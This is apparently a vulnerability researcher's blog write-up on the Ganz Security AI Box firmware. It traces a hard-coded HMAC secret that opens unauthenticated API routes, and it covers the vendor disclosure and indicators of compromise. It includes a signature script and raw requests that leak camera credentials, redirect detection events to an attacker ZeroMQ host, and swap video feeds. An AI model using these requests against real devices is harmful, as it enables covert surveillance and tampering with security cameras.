---
layout: post
title:  "Hacking Like Hollywood With Hard-Coded Secrets"
date:   2023-11-08 01:00:00 +0200
categories: vulns4free
---

> [GANZ Security AI Box](https://www.ganzsecurity.eu/index.php/en/products/aibox): A New Generation AI-Based Intelligent Video Analytics Solution - The intelligent extension for almost every camera system. Thanks to the numerous algorithms for deep learning and analysis with which it is equipped, the AI-BOX is able to recognize the detected objects precisely and immediately and classify them: People, vehicles, motorcycles, bicycles...

For this blog post, we have a target capable of providing Artificial Intelligence (AI) algorithms to detect different regions of interest in video streams. I found such a device at the public Internet some months ago during a normal working day but in the beginning didn't know which product was behind. All I got was this login page.

{:refdef: style="text-align: center;"}
![aibox.png](/assets/images/hollywood/aibox.png)
{: refdef}

First, I searched for similar instances via Censys, using the title "AI Box". Interestingly, I found **over 3000 devices** but not all of them with the  "Ganz Security Solutions" logo. A few months after the disclosure of the vulnerabilities to Ganz Security, a second surveillance camera system vendor made contact and told me that the core of the affected firmware is indeed used in different products of various vendors. It was sheer coincidence that I chose the Ganz Security firmware at first, it seems.

# The Firmware

Looking for the latest version of the firmware, I found the presumably correct binary blob at [https://www.ganzsecurity.it/index.php/jdownload/summary/5-firmware/706-ai-box4-72110-fw-100367](https://www.ganzsecurity.it/index.php/jdownload/summary/5-firmware/706-ai-box4-72110-fw-100367) (the link is already down at the time of this publication).

I then used the "binwalk on steroids", [unblob](https://unblob.org/), which even provides a Docker-ized version, making things a bit easier and more secure.

```bash
docker run \
  --rm \
  --pull always \
  -v ./unblob/output:/data/output \
  -v ./unblob/input:/data/input \
ghcr.io/onekey-sec/unblob:latest /data/input/$1
```

```
          Chunks distribution          
┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━┓
┃ Chunk type     ┃   Size    ┃ Ratio  ┃
┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━┩
│ EXTFS          │  1.99 GB  │ 47.57% │
│ SPARSE         │  1.10 GB  │ 26.16% │
│ SQUASHFS_V4_LE │ 780.80 MB │ 18.21% │
│ ELF64          │ 322.03 MB │ 7.51%  │
│ UNKNOWN        │ 10.51 MB  │ 0.25%  │
│ ZIP            │  6.21 MB  │ 0.14%  │
│ GZIP           │  5.88 MB  │ 0.14%  │
│ TAR            │ 870.00 KB │ 0.02%  │
│ AR             │ 299.94 KB │ 0.01%  │
└────────────────┴───────────┴────────┘
```

This looked promising, i.e. probably no encrypted blobs or similar stumbling blocks to get our hands dirty as fast as possible. Checking the extracted file system content at `72110.1.100367.100.bin_extract/72110.1.100367.100.nbn_extract/10691402-1186932114.sparse_extract/raw.image_extract` revealed a familiar root directory tree.

```bash
AIBOX  dev   init   lib64       mkimg.rootfs   nfsroot  root   sharefs  usr
bin    etc   komod  linuxrc     mknod_console  opt      sbin   sys      var
boot   home  lib    lost+found  mnt            proc     share  tmp
```

# Give URLs Please

Yes, we're all interested to get straight to the meat by finding the underlying technology, enumerating the routes, audit the handler implementations and pwn all the things. But let's do it step by step because blog posts often read a bit like magic.

What were we looking for first? Tech stack of course and I started with the first HTTP response.

```txt
HTTP/1.1 200 OK
Server: nginx <---------
Date: ...
Content-Type: text/html; charset=utf-8
Content-Length: 431
Connection: close
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>AI Box</title>
</head>
<body>
    <div id="app"></div>
    <script src="/static/media-stream-library.min.js"></script>
    <script src="/static/three.min.js"></script>
    <script src="/static/build.js?28dc5fdbfb1918e23af2e3aed6182ff1"></script>
</body>

</html>
```

Obviously, I first searched for the *nginx* configuration.

```bash
$ cat nginx.conf

user  root;
worker_processes  1;

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;
error_log /dev/null;

#pid        logs/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       mime.types;
    default_type  application/octet-stream;

    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';

    #access_log  logs/access.log  main;
    access_log off;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    #gzip  on;

    include /AIBOX/web/conf/nginx.conf; <-----------
}
```

Nothing to interesting but another `include` reference to `/AIBOX/web/conf/nginx.conf`.

```bash
$ cat ../../AIBOX/web/conf/nginx.conf
    server {
        listen        80;
        server_name  localhost;
        server_tokens off;

        #charset koi8-r;

        #access_log  logs/host.access.log  main;
        #
        ## onvif
        location /onvif {
            proxy_pass   http://127.0.0.1:10030;
	    }
	    ## http tunneling
        location /live {
            proxy_buffering off;
            chunked_transfer_encoding off;

            proxy_request_buffering off;

            proxy_pass  http://127.0.0.1:701;
	    }

        location / {
            root   html;
            index  index.html index.htm;
        }

        location = /favicon.ico {
            access_log off;
            log_not_found off;
            return 404;
        }

        location = /robots.txt {
            access_log off;
            log_not_found off;
            return 404;
        }
		[...]
    # HTTPS server
    #
    server {
        # error_page 497 = @fallback;
        error_page 497 https://$host:8443$request_uri;

        listen        8443 ssl; <-------
        server_name  _;
        server_tokens off;
		[...]
        ## onvif
        location /onvif {
            proxy_pass   http://127.0.0.1:10030;
	}
        
        location /itx {
            include proxy.conf;
        }
        location ~ ^/api/system/management/db/import/$ {
            client_max_body_size 256M;
            include proxy.conf;
        }
        location ~ ^/api/system/management/fwupdate/(upload|run)/$ {
            client_max_body_size 32M;
            include proxy.conf;
        }
        #Location for JanusGW - ugiepark 20190430
        #location /janus {
        #        proxy_set_header Host $host;
        #        proxy_set_header X-Real-IP $remote_addr;
        #        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        #        proxy_pass http://127.0.0.1:8088;
        #}
        #location /download/ {
        #    auth_digest 'itxrealm';
        #    auth_digest_user_file /etc/passwd.digest;
        #    auth_digest_expires 5s;
        #    auth_digest_replays 500;
        #    auth_digest_maxtries 30;
        #    auth_digest_evasion_time 60s;
        #    root /common;
        #    sendfile on;
        #}
        location /ws {
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "Upgrade";
            proxy_set_header Origin "";
            #proxy_set_header Host $host;
            #proxy_set_header X-Real-IP $remote_addr;
            #proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_pass http://127.0.0.1:702;
        }
        location / {
            #auth_digest 'itxrealm';
            #auth_digest_user_file /etc/passwd.digest;
            #auth_digest_expires 5s;
            #auth_digest_replays 500;
            #auth_digest_maxtries 30;
            #auth_digest_evasion_time 60s;
            include proxy.conf;
        }
		[...]
```

Since I found this AI Box web service being exposed on TCP port `8443`, focusing on the HTTPS configuration part made sense. There was indeed *tons of interesting information* on this nginx configuration file(s) to look for e.g. misconfigurations or simply to understand the architecture of this device. Just for the record: I ran into a lot of rabbit holes during this process!

But the `location /` directive should be a good starting point, so `proxy.conf` in the same directory was investigated next.

```bash
$ cat proxy.conf 
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_pass http://127.0.0.1:8000;
```

A web service running on TCP port 8000, listening only on the loopback interface seemed to handle incoming HTTP requests for this case. But we didn't have access to an AI Box through a shell or something. Also I didn't want to waste a lot of time with trying to get this running in a QEMU environment at this early stage of investigation. So I decided: let's just go to the parent directory `AIBOX/web` first and try to l00t some stuff. The `run.py` contained the following Python code.

```python
from webra import create_app, create_api_spec, cert_restore

if __name__ == '__main__':
    app = create_app() # [1]

    # cert restore
    cert_restore()

    # api document
    create_api_spec(app)

    # run server
    # app.run(host='0.0.0.0', threaded=True, port=8000, debug=False)
    app.run(host='127.0.0.1', threaded=True, port=8000, debug=False)
```

Direct hit! We recognize the port 8000 again and we knew Python was the next part of our tech stack enumeration. Following the code at `[1]` brought me to the file `webra/__init__.py`.

```python
from apispec import APISpec
from apispec.ext.marshmallow import MarshmallowPlugin
from apispec_webframeworks.flask import FlaskPlugin
from marshmallow import Schema, fields
from flask import Flask
from . import urls

from webra.routes import api_network_video_source, api_network_metadata
from webra.routes import api_system_info, api_system_management
from webra.routes import api_board_io, api_bi_counter
from webra.routes import api_rule_event_server
from webra.routes import api_snapshot
from webra.routes import api_source_lpr
from webra.routes import api_source_fr
from webra.routes import api_capability
from webra.routes import api_network_wireless_setup
from webra.routes import api_system_db
import json
import os
import shutil

def create_app():
    app = Flask(__name__, instance_relative_config=True) # [2]
    app.config.from_mapping(
        SECRET_KEY='dev',
        DATABASE=os.path.join(app.instance_path, 'db.sqlite3'),
    )
    app.config.from_pyfile('config.py', silent=True)
    app.config['MAX_CONTENT_LENGTH'] = 256 * 1024 * 1024

    urls.init_app(app)
    return app
[...]
```

`[2]` disclosed that the targeted web services were built on *Flask*, a [micro web framework](https://palletsprojects.com/p/flask/) written in Python. We spotted other interesting clues like hard-coded secret keys, SQLite as database engine etc. pp. Going back to `run.py` a method `create_api_spec(app)` got called.

```python
def create_api_spec(app):
    # api doucment
    #  refer
    #  - https://redocly.github.io/redoc/
    #  - https://redocly.github.io/redoc/openapi.yaml
    #  - https://marshmallow.readthedocs.io/en/stable/api_reference.html
    #  - https://apispec.readthedocs.io/en/latest/special_topics.html
    info = {
        "description": ('# Authentication\n'
                        '1. User-Agent in HTTP header SHOULD be \"Client Application\".\n'
                        '2. One of the following HTTP API authentications is required:\n'
                        '  - Digest Authentication (Recommended)\n'
                        '  - Basic Authentication\n'
                        '\nMost HTTP clients or libraries support these authentication methods. (E.g. curl, wget, Postman)\n'
                        )
    }
    spec = APISpec(
        title="HTTP API Document",
        version="1.0.0",
        openapi_version="3.0.2",
        plugins=[FlaskPlugin(), MarshmallowPlugin()],
        servers=[{'url': '/'}],
        info=info,
        tags=[],
    )

    with app.test_request_context(): # [3]
        spec.path(view=api_capability.get_capability)
        spec.path(view=api_network_video_source.get_vsources)
        spec.path(view=api_network_video_source.update_vsources)
        spec.path(view=api_source_lpr._CR_lps)
        spec.path(view=api_source_lpr._UD_lp)
        spec.path(view=api_source_lpr._REL_bind)
        spec.path(view=api_source_lpr._REL_unbind)
        spec.path(view=api_source_fr._CR_faces)
        spec.path(view=api_source_fr._UD_face)
		[...]
```

Nice, an API specification definition probably generating Swagger-like output for different URI paths listed at `[3]`. `spec.path(view=api_network_video_source.get_vsources)` sounded like an interesting path for a first drill-down. We're looking at an AI Box doing fancy stuff with video stream content, right? Jumping to the route definition in `webra/routes/api_network_video_source.py` showed this.

```python
@bp.route('/', methods=['GET'])
def get_vsources():
    """
    Video Source 조회
    ---
    get:
      tags:
        - Video Source
      summary: Get Video Sources
      description: |
        Returns a list of video sources.<br>
        The length of the list is the maximum number of channels supported by the device.

      responses:
        '200':
          description: successful operation
          content:
            application/json:
              schema:
                type: array
                items: VideoSourceSchema
    """
    vsources = []
		count = nf_sysdb.get_uint("net.vsource.count")
	[...]
```

The `nf_sysdb` modules by the way were not resolved in my IDE automatically. Why? Because these were defined in `.pyc` files. One had to decompile these with one of many pyc decompilers available today. 

> pyc file contains the “compiled bytecode” of the imported module/program so that the “translation” from source code to bytecode can be skipped on subsequent imports of the *. py file. Having a *. pyc file saves the compilation time of converting the python source code to byte code, every time the file is imported. ([Source](https://www.geeksforgeeks.org/how-to-remove-all-pyc-files-in-python/))

As the name of the module indicated, these were operations on the database but I wasn't interested in these too much, so let's just proceed. Unfortunately, I couldn't simply call the endpoint from an unauthenticated context. The "responsible" part: `from ..auth.digest import auth` probably. Investigating a bit further brought me back to the method `create_app()`.

```python
def create_app():
    app = Flask(__name__, instance_relative_config=True)
		[...]
    urls.init_app(app) # [4]
    return app
```

We follow the call at `[4]` to `webra/urls.py`.

```python
def init_app(app):
    for url in urls:
        bp, prefix, login_required = url
        if login_required:
            bp.before_request(auth.login_required(lambda *args: None))
            bp.before_request(check_permission)
        app.register_blueprint(bp, url_prefix=prefix)
[...]
```

For every entry in the `urls` list, a triple `bp, prefix, login_required` was read. If `login_required` evaluated to `True`, the `auth.login_required()` call got relevant, implemented in `bwebra/auth/multiauth.py`. The code basically checked for *Bearer tokens* and *Basic Auth* headers which were then validated in subsequent steps. I didn't spot any immediate flaws in their logic (you might?), so got back to the `urls` list.

```python
urls = [
    # (blueprint, url_prefix, login_required)
    (api_capability.bp, '/itx', False),
    # (api_rule_face_recognition.bp, '/api-noauth/rule/fr', False),
    (api_events.bp, '/api/events', True),
    (api_event_callback_zmq.bp, '/api/event/callback/zmq', True),
    (api_network_ip_setup.bp, '/api/network/ip', True),
    (api_network_metadata.bp, '/api/network/metadata', True),
    (api_network_video_source.bp, '/api/network/vsources', True),
    (api_network_sequrinet.bp, '/api/network/sequrinet', True),
	[...]
```

As expected, every entry consisted of a triple, the third part specifying the `login_required` condition. At the very top, I found (the only) entry with a `False`: `(api_capability.bp, '/itx', False)`. No authentication required for routes defined in `webra/routes/api_capability.py`? Let's have a look at the route definitions.

```python
@bp.route('/capability/', methods=['GET'])
def get_capability():
    """
    Get Capability
    ---
    get:
      tags:
        - Capability
      summary: Get Capability
      description: Get system capability, license info, etc.
	  [...]
```

Mhmm, no authentication/authorization checks visible but also not really any code with interesting processing of user-controllable input. Next one:

```python
@bp.route('/ai/analytics/', methods=['GET'])
def get_ai_analytics():
    if not authentication( # [6]
            request.headers.get('X-Auth-Signature'),
            request.headers.get('Date'),
            request.data.decode()):
        return HttpUnauthorized("")
    
    vsources = []
    lang = request.args.get("lang", "en") # [5]
    count = nf_sysdb.get_uint("net.vsource.count")
	[...]
```

Yes, some user-controlled input indeed at `[5]` but what is `[6]` all about? They implemented another "authentication" check just for this routing class? Great...

# The Flaw

The authentication (or better authorization imho) check seemed to use different parts of the request to decide if access would be granted or not via the method `authentication`.

```python
def authentication(signature, rfc822_date, body):
    try:
        plain = '{0}:{1}'.format(body, rfc822_date)
        hamc_key = '[REDACTED]'
        signature_want = hmac.new(hamc_key.encode(), plain.encode(), hashlib.sha256).hexdigest()

        timestamp = email.utils.mktime_tz((email.utils.parsedate_tz(rfc822_date)))
        expires = timestamp + 3600
        cur_ts = int(time.time())

    except Exception as e:
        print(e)
        return False

    if signature_want == signature:
        if cur_ts < expires and cur_ts - timestamp < 3600:
            return True
        print("* Token Auth Failed. cur_ts[{}] expires[{}]".format(cur_ts, expires))
    return False
```

So the method took three parameters from the request:

- A header value for the key `X-Auth-Signature`
- A header value for the key `Date`
- The request body content

Here was the flaw: **a hard-coded secret** for the HMAC calculation in `hamc_key` (yes, I copypasta'd this variable name). The provided request body got concatenated with the provided `Date` header value and then `hmac.new` calculated a signature value across the entire content. If the calculated value equaled to the header value for `X-Auth-Signature`: **Access Granted**. Also one had to take into account that there was an accepted time range only for the corresponding `Date` value. This shouldn't have been a problem, though, since a simple GET request to `/` returned the device's timestamp in the `Date` response header anyways.

# Exploitation

So all the routes in `webra/routes/api_capability.py` should theoretically now have been accessible to us. For a simple GET request to e.g. the URI path `/itx/ai/analytics/`, we could calculate the the HMAC easily

```python
import hashlib
import hmac

body = ""
rfc822_date = "Mon, 26 Jun 2023 08:03:16 GMT"

plain = '{0}:{1}'.format(body, rfc822_date)
hamc_key = '<REDACTED>'
signature_want = hmac.new(hamc_key.encode(), plain.encode(), hashlib.sha256).hexdigest()

print(signature_want)
```

and sent the following request:

```
GET /itx/ai/analytics/ HTTP/1.1
Host: HOST:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Auth-Signature: 2b8d91502dbd42a8f3ec98e44d062157c64ae2aea4f6a7730da1256ca218f446
Date: Mon, 26 Jun 2023 08:03:16 GMT
Connection: close
```

The AI Box responded with the following content:

```
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 26 Jun 2023 08:03:58 GMT
Content-Type: application/json
Content-Length: 4049
Connection: close
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

[
  {
    "ai": "mot_human_car_mid", 
    "algo_type": "mot", 
    "category": "Human/Car", 
    "ch": 0, 
    "name": "Entrance 1", 
    "text": "Human / Vehicle Detector", 
    "url": "rtsp://ADMIN:12345@10.0.0.1:5553/live/second0"
  }, 
  {
    "ai": "mot_human_car_mid", 
    "algo_type": "mot", 
    "category": "Human/Car", 
    "ch": 1, 
    "name": "Security Zone 2", 
    "text": "Human / Vehicle Detector", 
    "url": "rtsp://ADMIN:12345@10.0.0.1:5553/live/second1"
  }, 
  {
    "ai": "mot_human_car_mid", 
    "algo_type": "mot", 
    "category": "Human/Car", 
    "ch": 2, 
    "name": "Supplier Entrance", 
    "text": "Human / Vehicle Detector", 
    "url": "rtsp://ADMIN:12345@10.0.0.1:5553/live/second2"
  }
  [...]
```

Great! No *401 Unauthorized*  but configurations of video source channels with IP address and even credentials. Ok, but where is the Hollywood part now, you might ask?! I got two API calls for you for the cinema feelings.

#### Track Detections

What about receiving an event to your attacker machine every time a vehicle, person etc. would have been detected on one of the video input streams? The following API will help us to do exactly this.

```python
@bp.route('/ai/owner/', methods=['POST'])
def post_ai_owner():
    if not authentication(
            request.headers.get('X-Auth-Signature'),
            request.headers.get('Date'),
            request.data.decode()):
        return HttpUnauthorized("")

    data = request.get_json(force=True) # [7]
    owner = data.get("owner")
    zmq_addr = data.get("zmq_addr")

    if not owner or len(owner) < 12:
        return HttpBadRequest("The valid `owner` param is required.")

    if not zmq_addr or "tcp://" not in zmq_addr:
        return HttpBadRequest("The valid `zma_addr` param is required.")

    _owner = nf_sysdb.get_str("ai.analytics.owner")
    if owner != _owner and _owner != "":
        return HttpForbidden("other owner is already registered.")

    nf_sysdb.set_str("ai.analytics.owner", owner)

    # count = nf_sysdb.get_uint("event.callback.zmq.count")
    # for i in range(count):
    #     if i == 0:
    #         nf_sysdb.set_str("event.callback.zmq.Z{}.addr".format(i), zmq_addr)
    #     else:
    #         nf_sysdb.set_str("event.callback.zmq.Z{}.addr".format(i), "")
    nf_sysdb.set_zmq_meta_addrs([zmq_addr])

    return jsonify(data)
```

At `[7]` our POST request body was parsed as JSON. The JSON should contain two members, `owner` and `zmq_addr`. I understood `owner` but `zmq_addr`? After asking Google, I was pretty sure to define a **ZeroMQ** host URL with this. According to [Wikipedia](https://en.wikipedia.org/wiki/ZeroMQ):

> ZeroMQ (...) is an asynchronous messaging library, aimed at use in distributed or concurrent applications. It provides a message queue, but unlike message-oriented middleware, a ZeroMQ system can run without a dedicated message broker; the zero in the name is for zero broker. The library's API is designed to resemble Berkeley sockets.

I had to implement a "ZeroMQ" participant component then, right?

```python
#!/usr/bin/env python3

import time
import zmq

context = zmq.Context()
socket = context.socket(zmq.PULL) # PULL, PUB, REP
socket.bind("tcp://*:1337")
print("[+] ZMQ server started")

while True:
    #  Wait for next request from client
    message = socket.recv()
    print("Received request: %s" % message)
    print("---------------------------------------------")

    #  Do some 'work'
```

Now sending a POST request as shown next, should configure our attacker host as ZeroMQ participant:

```
POST /itx/ai/owner/ HTTP/1.1
Host: HOST:8443
X-Auth-Signature: [HMAC_VALUE]
Date: Mon, 19 Jun 2023 11:32:20 GMT
Connection: close
Content-Type: application/json
Content-Length: [length]

{"owner":"Tom Cruise Ltd", "zmq_addr":"tcp://[ATTACKER_HOST:1337]"}
```

And indeed, almost immediately after the POST request was sent, my ZeroMQ Python server began to receive data from the AI Box. I cannot provide the screenshots due to confidentiality (yes, I also altered all the other request/response contents) but incoming messages looked something like this:

```txt
Received request: b'{"source":"rtsp://10.0.0.1:555/Streaming/Channels/1?transportmode=unicast", "topic":"Detector/ObjectDetected","metadata":{"annotations":[{"class":"person","score":0.430000000123123123,"track_id":23234}]}}
```

Every minute or so I even observed informative "Heartbeat" messages `"topic":"System/Keepalive/Heartbeat"` containing all the configuration data. So this allowed me to track every detection event of persons, vehicles etc. as well as retrieving the current state of configuration of the device repeatedly.

#### Change Video Source

The final Hollywood call? What if we could change the video input source URLs such that we'd have been able to serve our own video stream content? Here we go, changing the input source channel 14 RTSP URL with our own URL:

```
POST /itx/ai/analytics/?owner=Tom+Cruise+Ltd HTTP/1.1
Host: HOST:8443
X-Auth-Signature: [HMAC_VALUE]
Date: Mon, 19 Jun 2023 11:55:14 GMT
Connection: close
Content-Type: application/json
Content-Length: [length]

[{"ch":"14", "name":"my own channel", "url":"rtsp://[ATTACKER_HOST]/mystream"}]
```

# Conclusions

We didn't find an unauth'd RCE but at least some unauth'd "Mr. Robot bugs". Again, be aware that the Ganz Security Solutions device firmware might not be the solely responsible for these flaws. You'll find more devices by other vendors and resellers when comparing Censys results with the login page I provided in the beginning of this blog post. Full impact for now? Not sure, yet. Also, after my disclosure process, Ganz Security provided a patched firmware version (mid of July 2023) to their customers but never really disclosed any issues to the public. Check your firmware version on your devices to be at least dated to 2023.

# Internet Exposure Check

As mentioned in the introduction, a non-exhaustive Censys search revealed **more than 3000 devices** on the public Internet.

# Indicators of Compromise (IoCs)

Unfortunately, I can only give vague advices this time because I don't have shell access to such a device. These findings were found only through static analysis and tested against a few live targets over the Internet. But blocking and/or monitoring of any requests targeting `/itx` URI paths might be a good idea. Taking into account the request headers `X-Auh-Signature` and `Date` might also help to differentiate.